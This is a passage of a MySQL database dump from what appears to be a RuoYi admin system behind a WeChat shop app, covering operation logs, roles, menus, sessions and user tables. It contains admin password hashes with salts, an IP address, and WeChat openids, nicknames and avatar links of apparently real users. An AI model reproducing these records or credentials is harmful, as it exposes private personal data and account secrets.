.columnComment\":[\"描述\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"miaoshu\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].htmlType\":[\"input\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"87\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"图片\"],\"columns[4].javaType\":[\"String\"],\"columns[4].javaField\":[\"picture\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].isEdit\":[\"1\"],\"columns[4].isList\":[\"1\"],\"columns[4].isQuery\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"input\"],\"columns[4].dictType\":[\"\"],\"columns[5].columnId\":[\"88\"],\"columns[5].sort\":[\"6\"],\"columns[5].columnComment\":[\"库存\"],\"columns[5].javaType\":[\"String\"],\"columns[5].javaField\":[\"kucun\"],\"columns[5].isInsert\":[\"1\"],\"columns[5]','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:39:31'),(137,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/shoplist','124.126.96.184','XX XX','\"shoplist\"',NULL,0,NULL,'2022-04-04 22:39:34'),(138,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/shoplist','124.126.96.184','XX XX','\"shoplist\"',NULL,0,NULL,'2022-04-04 22:39:34'),(139,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','124.126.96.184','XX XX','{\"tableId\":[\"11\"],\"tableName\":[\"lunbo\"],\"tableComment\":[\"轮播图\"],\"className\":[\"Lunbo\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"78\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"ID\"],\"columns[0].javaType\":[\"Long\"],\"columns[0].javaField\":[\"id\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"79\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"轮播图\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"pic\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"EQ\"],\"columns[1].htmlType\":[\"textarea\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"80\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"指向地址\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"nav\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"EQ\"],\"columns[2].htmlType\":[\"input\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"81\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"描述\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"comm\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].htmlType\":[\"input\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"82\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"创建时间\"],\"columns[4].javaType\":[\"Date\"],\"columns[4].javaField\":[\"createTime\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"datetime\"],\"columns[4].dictType\":[\"\"],\"tplCategory\":[\"crud\"],\"packageName\":[\"com.ruoyi.project.system\"],\"moduleName\":[\"system\"],\"businessName\":[\"lunbo\"],\"functionName\":[\"轮播图\"],\"params[parentMenuId]\":[\"2026\"],\"params[parentMenuName]\":[\"商品管理\"],\"genType\":[\"0\"],\"genPath\":[\"/\"],\"subTableName\":[\"\"],\"params[treeCode]\":[\"\"],\"pa','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:40:19'),(140,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/lunbo','124.126.96.184','XX XX','\"lunbo\"',NULL,0,NULL,'2022-04-04 22:40:22'),(141,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/lunbo','124.126.96.184','XX XX','\"lunbo\"',NULL,0,NULL,'2022-04-04 22:40:22'),(142,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','124.126.96.184','XX XX','{\"tableId\":[\"10\"],\"tableName\":[\"location\"],\"tableComment\":[\"位置列表\"],\"className\":[\"Location\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"66\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"\"],\"columns[0].javaType\":[\"Long\"],\"columns[0].javaField\":[\"locid\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"67\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"openid\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"openid\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"EQ\"],\"columns[1].isRequired\":[\"1\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"68\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"收货人\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"name\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"LIKE\"],\"columns[2].isRequired\":[\"1\"],\"columns[2].htmlType\":[\"input\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"69\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"电话\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"phone\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].isRequired\":[\"1\"],\"columns[3].htmlType\":[\"input\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"70\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"详细地址\"],\"columns[4].javaType\":[\"String\"],\"columns[4].javaField\":[\"addressDetail\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].isEdit\":[\"1\"],\"columns[4].isList\":[\"1\"],\"columns[4].isQuery\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"input\"],\"columns[4].dictType\":[\"\"],\"columns[5].columnId\":[\"71\"],\"columns[5].sort\":[\"6\"],\"columns[5].columnComment\":[\"地址\"],\"columns[5]','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:41:59'),(143,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/location','124.126.96.184','XX XX','\"location\"',NULL,0,NULL,'2022-04-04 22:42:03'),(144,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/location','124.126.96.184','XX XX','\"location\"',NULL,0,NULL,'2022-04-04 22:42:03'),(145,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2007','124.126.96.184','XX XX','2007','{\"msg\":\"存在子菜单,不允许删除\",\"code\":301}',0,NULL,'2022-04-04 22:43:24'),(146,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2008','124.126.96.184','XX XX','2008','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:43:28'),(147,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2011','124.126.96.184','XX XX','2011','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:43:38'),(148,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2012','124.126.96.184','XX XX','2012','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:44:08'),(149,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2010','124.126.96.184','XX XX','2010','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:44:12'),(150,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2009','124.126.96.184','XX XX','2009','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:44:16'),(151,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2007','124.126.96.184','XX XX','2007','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:44:20'),(152,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','124.126.96.184','XX XX','{\"menuId\":[\"3\"],\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"系统工具\"],\"url\":[\"#\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"3\"],\"icon\":[\"fa fa-bars\"],\"visible\":[\"1\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:44:29'),(153,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','124.126.96.184','XX XX','{\"menuId\":[\"2\"],\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"系统监控\"],\"url\":[\"#\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"2\"],\"icon\":[\"fa fa-video-camera\"],\"visible\":[\"1\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:44:36'),(154,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2044','124.126.96.184','XX XX','2044','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:45:23'),(155,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2043','124.126.96.184','XX XX','2043','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:45:28'),(156,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2042','124.126.96.184','XX XX','2042','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:45:32'),(157,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2040','124.126.96.184','XX XX','2040','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:45:37'),(158,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2041','124.126.96.184','XX XX','2041','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:45:41'),(159,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/2039','124.126.96.184','XX XX','2039','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:45:44'),(160,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','124.126.96.184','XX XX','{\"menuId\":[\"1\"],\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"系统管理\"],\"url\":[\"#\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"1\"],\"icon\":[\"fa fa-gear\"],\"visible\":[\"1\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:46:02');
/*!40000 ALTER TABLE `sys_oper_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_post`
--

DROP TABLE IF EXISTS `sys_post`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_post` (
  `post_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '岗位ID',
  `post_code` varchar(64) NOT NULL COMMENT '岗位编码',
  `post_name` varchar(50) NOT NULL COMMENT '岗位名称',
  `post_sort` int(4) NOT NULL COMMENT '显示顺序',
  `status` char(1) NOT NULL COMMENT '状态（0正常 1停用）',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`post_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='岗位信息表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_post`
--

LOCK TABLES `sys_post` WRITE;
/*!40000 ALTER TABLE `sys_post` DISABLE KEYS */;
INSERT INTO `sys_post` VALUES (1,'ceo','董事长',1,'0','admin','2022-01-05 13:37:28','',NULL,''),(2,'se','项目经理',2,'0','admin','2022-01-05 13:37:28','',NULL,''),(3,'hr','人力资源',3,'0','admin','2022-01-05 13:37:28','',NULL,''),(4,'user','普通员工',4,'0','admin','2022-01-05 13:37:28','',NULL,'');
/*!40000 ALTER TABLE `sys_post` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_role`
--

DROP TABLE IF EXISTS `sys_role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_role` (
  `role_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '角色ID',
  `role_name` varchar(30) NOT NULL COMMENT '角色名称',
  `role_key` varchar(100) NOT NULL COMMENT '角色权限字符串',
  `role_sort` int(4) NOT NULL COMMENT '显示顺序',
  `data_scope` char(1) DEFAULT '1' COMMENT '数据范围（1：全部数据权限 2：自定数据权限 3：本部门数据权限 4：本部门及以下数据权限）',
  `status` char(1) NOT NULL COMMENT '角色状态（0正常 1停用）',
  `del_flag` char(1) DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`role_id`)
) ENGINE=InnoDB AUTO_INCREMENT=100 DEFAULT CHARSET=utf8 COMMENT='角色信息表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_role`
--

LOCK TABLES `sys_role` WRITE;
/*!40000 ALTER TABLE `sys_role` DISABLE KEYS */;
INSERT INTO `sys_role` VALUES (1,'超级管理员','admin',1,'1','0','0','admin','2022-01-05 13:37:28','',NULL,'超级管理员'),(2,'普通角色','common',2,'2','0','0','admin','2022-01-05 13:37:28','',NULL,'普通角色');
/*!40000 ALTER TABLE `sys_role` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_role_dept`
--

DROP TABLE IF EXISTS `sys_role_dept`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_role_dept` (
  `role_id` bigint(20) NOT NULL COMMENT '角色ID',
  `dept_id` bigint(20) NOT NULL COMMENT '部门ID',
  PRIMARY KEY (`role_id`,`dept_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='角色和部门关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_role_dept`
--

LOCK TABLES `sys_role_dept` WRITE;
/*!40000 ALTER TABLE `sys_role_dept` DISABLE KEYS */;
INSERT INTO `sys_role_dept` VALUES (2,100),(2,101),(2,105);
/*!40000 ALTER TABLE `sys_role_dept` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_role_menu`
--

DROP TABLE IF EXISTS `sys_role_menu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_role_menu` (
  `role_id` bigint(20) NOT NULL COMMENT '角色ID',
  `menu_id` bigint(20) NOT NULL COMMENT '菜单ID',
  PRIMARY KEY (`role_id`,`menu_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='角色和菜单关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_role_menu`
--

LOCK TABLES `sys_role_menu` WRITE;
/*!40000 ALTER TABLE `sys_role_menu` DISABLE KEYS */;
INSERT INTO `sys_role_menu` VALUES (2,1),(2,2),(2,3),(2,4),(2,100),(2,101),(2,102),(2,103),(2,104),(2,105),(2,106),(2,107),(2,108),(2,109),(2,110),(2,111),(2,112),(2,113),(2,114),(2,115),(2,116),(2,500),(2,501),(2,1000),(2,1001),(2,1002),(2,1003),(2,1004),(2,1005),(2,1006),(2,1007),(2,1008),(2,1009),(2,1010),(2,1011),(2,1012),(2,1013),(2,1014),(2,1015),(2,1016),(2,1017),(2,1018),(2,1019),(2,1020),(2,1021),(2,1022),(2,1023),(2,1024),(2,1025),(2,1026),(2,1027),(2,1028),(2,1029),(2,1030),(2,1031),(2,1032),(2,1033),(2,1034),(2,1035),(2,1036),(2,1037),(2,1038),(2,1039),(2,1040),(2,1041),(2,1042),(2,1043),(2,1044),(2,1045),(2,1046),(2,1047),(2,1048),(2,1049),(2,1050),(2,1051),(2,1052),(2,1053),(2,1054),(2,1055),(2,1056),(2,1057),(2,1058),(2,1059),(2,1060),(2,1061);
/*!40000 ALTER TABLE `sys_role_menu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_user`
--

DROP TABLE IF EXISTS `sys_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_user` (
  `user_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `dept_id` bigint(20) DEFAULT NULL COMMENT '部门ID',
  `login_name` varchar(30) NOT NULL COMMENT '登录账号',
  `user_name` varchar(30) DEFAULT '' COMMENT '用户昵称',
  `user_type` varchar(2) DEFAULT '00' COMMENT '用户类型（00系统用户 01注册用户）',
  `email` varchar(50) DEFAULT '' COMMENT '用户邮箱',
  `phonenumber` varchar(11) DEFAULT '' COMMENT '手机号码',
  `sex` char(1) DEFAULT '0' COMMENT '用户性别（0男 1女 2未知）',
  `avatar` varchar(100) DEFAULT '' COMMENT '头像路径',
  `password` varchar(50) DEFAULT '' COMMENT '密码',
  `salt` varchar(20) DEFAULT '' COMMENT '盐加密',
  `status` char(1) DEFAULT '0' COMMENT '帐号状态（0正常 1停用）',
  `del_flag` char(1) DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
  `login_ip` varchar(128) DEFAULT '' COMMENT '最后登录IP',
  `login_date` datetime DEFAULT NULL COMMENT '最后登录时间',
  `pwd_update_date` datetime DEFAULT NULL COMMENT '密码最后更新时间',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=100 DEFAULT CHARSET=utf8 COMMENT='用户信息表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_user`
--

LOCK TABLES `sys_user` WRITE;
/*!40000 ALTER TABLE `sys_user` DISABLE KEYS */;
INSERT INTO `sys_user` VALUES (1,103,'admin','若依','00','ry@163.com','15888888888','1','','29c67a30398638269fe600f73a054934','111111','0','0','124.126.96.184','2022-04-04 22:22:49','2022-01-05 13:37:28','admin','2022-01-05 13:37:28','','2022-04-04 22:22:49','管理员'),(2,105,'ry','若依','00','ry@qq.com','15666666666','1','','8e6d98b90472783cc73c17047ddccf36','222222','0','0','127.0.0.1','2022-01-05 13:37:28','2022-01-05 13:37:28','admin','2022-01-05 13:37:28','',NULL,'测试员');
/*!40000 ALTER TABLE `sys_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_user_online`
--

DROP TABLE IF EXISTS `sys_user_online`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_user_online` (
  `sessionId` varchar(50) NOT NULL DEFAULT '' COMMENT '用户会话id',
  `login_name` varchar(50) DEFAULT '' COMMENT '登录账号',
  `dept_name` varchar(50) DEFAULT '' COMMENT '部门名称',
  `ipaddr` varchar(128) DEFAULT '' COMMENT '登录IP地址',
  `login_location` varchar(255) DEFAULT '' COMMENT '登录地点',
  `browser` varchar(50) DEFAULT '' COMMENT '浏览器类型',
  `os` varchar(50) DEFAULT '' COMMENT '操作系统',
  `status` varchar(10) DEFAULT '' COMMENT '在线状态on_line在线off_line离线',
  `start_timestamp` datetime DEFAULT NULL COMMENT 'session创建时间',
  `last_access_time` datetime DEFAULT NULL COMMENT 'session最后访问时间',
  `expire_time` int(5) DEFAULT '0' COMMENT '超时时间，单位为分钟',
  PRIMARY KEY (`sessionId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='在线用户记录';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_user_online`
--

LOCK TABLES `sys_user_online` WRITE;
/*!40000 ALTER TABLE `sys_user_online` DISABLE KEYS */;
INSERT INTO `sys_user_online` VALUES ('2f004a62-d6b1-4f10-8b34-253571e8fd2b','admin','研发部门','124.126.96.184','XX XX','Chrome 10','Windows 10','on_line','2022-04-04 22:22:45','2022-04-04 22:45:23',1800000);
/*!40000 ALTER TABLE `sys_user_online` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_user_post`
--

DROP TABLE IF EXISTS `sys_user_post`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_user_post` (
  `user_id` bigint(20) NOT NULL COMMENT '用户ID',
  `post_id` bigint(20) NOT NULL COMMENT '岗位ID',
  PRIMARY KEY (`user_id`,`post_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户与岗位关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_user_post`
--

LOCK TABLES `sys_user_post` WRITE;
/*!40000 ALTER TABLE `sys_user_post` DISABLE KEYS */;
INSERT INTO `sys_user_post` VALUES (1,1),(2,2);
/*!40000 ALTER TABLE `sys_user_post` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_user_role`
--

DROP TABLE IF EXISTS `sys_user_role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_user_role` (
  `user_id` bigint(20) NOT NULL COMMENT '用户ID',
  `role_id` bigint(20) NOT NULL COMMENT '角色ID',
  PRIMARY KEY (`user_id`,`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户和角色关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_user_role`
--

LOCK TABLES `sys_user_role` WRITE;
/*!40000 ALTER TABLE `sys_user_role` DISABLE KEYS */;
INSERT INTO `sys_user_role` VALUES (1,1),(2,2);
/*!40000 ALTER TABLE `sys_user_role` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `userinfo`
--

DROP TABLE IF EXISTS `userinfo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `userinfo` (
  `openid` varchar(30) NOT NULL COMMENT 'openid',
  `nickName` varchar(45) NOT NULL COMMENT '昵称',
  `avatarUrl` longtext NOT NULL COMMENT '头像',
  `gender` tinyint(1) NOT NULL DEFAULT '0' COMMENT '性别',
  `jifen` int(200) DEFAULT '0' COMMENT '积分',
  `province` varchar(20) DEFAULT NULL COMMENT '省',
  `city` varchar(20) DEFAULT NULL COMMENT '城市',
  `userid` int(200) DEFAULT NULL,
  `create_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`openid`),
  UNIQUE KEY `openid` (`openid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `userinfo`
--

LOCK TABLES `userinfo` WRITE;
/*!40000 ALTER TABLE `userinfo` DISABLE KEYS */;
INSERT INTO `userinfo` VALUES ('null','母笑阳','https://thirdwx.qlogo.cn/mmopen/vi_32/PiajxSqBRaEKAJXXqibYHyKRKXoQlQ8AzibNnwF9k3dAh9ZKS2JjDFUMYiaDcRSbuN4tcPM9Qhs6kQGMIibJ0prNkFQ/132',2,1264,'Hebei','Baoding',NULL,'2021-10-05 17:05:07'),('o0fkt4-tgzcDnyAeh24Ai2Tq__NE','徐','https://thirdwx.qlogo.cn/mmopen/vi_32/db8tBFEKan2Y3x2eAoPBUX2IBegIfHK0Eox2t9379cpcYPzZdTYXTXfAYgx48KhrbTJvGJdhRe0iavQYWhpmDLw/132',1,0,'Hebei','Cangzhou',NULL,'2021-10-04 02:31:41'),('o0fkt41rqYF2lk_TiEB2sQD2Y6PE','陈怡婷','https://thirdwx.qlogo.cn/mmhead/XYUDB2GRSYWeMsCl22nPalhtE5iaLHV5e2w3PXbicSsZI/132',0,0,'','',NULL,'2021-10-09 23:54:07'),('o0fkt42KeHftEXD1tNIeJRwqKa-c','realxu','https://thirdwx.qlogo.cn/mmopen/vi_32/AwcvGianMLCIgh5THhoILK1JM1S1tc1tN4D8N6ic5M4Tsu57f63o2ic2j6ia9dw2XmJmOTRWA7Uhx13KIZeYvc1DnQ/132',0,0,'','',NULL,'2021-10-04 02:31:41'),('o0fkt43-e1kjXtyfSSWn6H25CYlQ','时光、炎凉～～','https://thirdwx.qlogo.cn/mmopen/vi_32/t6KWXFtl8MVF1DLibzxHSURu34vHlIRYqt5SVVmS4baNtmU5ERIPz4LBsudAibws8wEVQWYIyDxuaSMma4DVgekA/132',1,0,'','',NULL,'2021-10-08 10:26:53'),('o0fkt439XpybBQDJXwYai3V2tfPg','林慧齐','https://thirdwx.qlogo.cn/mmhead/8crE0icJmlhkyC1WJWqJ6ibuTxOpqUAABp3lRumxCq43U/132',0,0,'','',NULL,'2021-10-08 01:54:34'),('o0fkt43I8mr_KCRpZ7EqhbgKM_FM','一直','https://thirdwx.qlogo.cn/mmopen/vi_32/HZwvcDS4FXucozJrrLxXNZH7QZR1TgsZ4JT9oKKIpftfRsiaGZt0jjEQh36M94aLBgONYcxc5MSVGS2OEvdKP3A/132',1,0,'Henan','Nanyang',NULL,'2021-10-10 07:57:17'),('o0fkt44rVcP4D3OH0qhPDAGR2l7A','蔡怡君','https://thirdwx.qlogo.cn/mmhead/HpqvLmh1Gnf2v03sUfwzNbczPvdFKh5RoE5qZ6KlibIs/132',0,0,'','',NULL,'2021-10-07 06:22:33'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','学涂','https://thirdwx.qlogo.cn/mmopen/vi_32/QEsPrrdMvoYUuQtmeTEvZncYNyKfxPWEV4PoEeYdepic91sr6k2QqGuFzRNw64QABywhymJDdknJBZs0P4qBmng/132',1,727,'Beijing','Changping',1,'2021-10-04 02:31:41'),('o0fkt455tXcfvKD28ZrpL-aVSAqQ','Sen','https://thirdwx.qlogo.cn/mmopen/vi_32/WXvmAHfDFVAbianlbIFj4K01jgWOcvVRT1RpIg7VSC6IicDzBpiad24Aa4skCeWIshNMwK8fcFicgXJnkt5DBuWgtA/132',1,0,'','',NULL,'2021-10-14 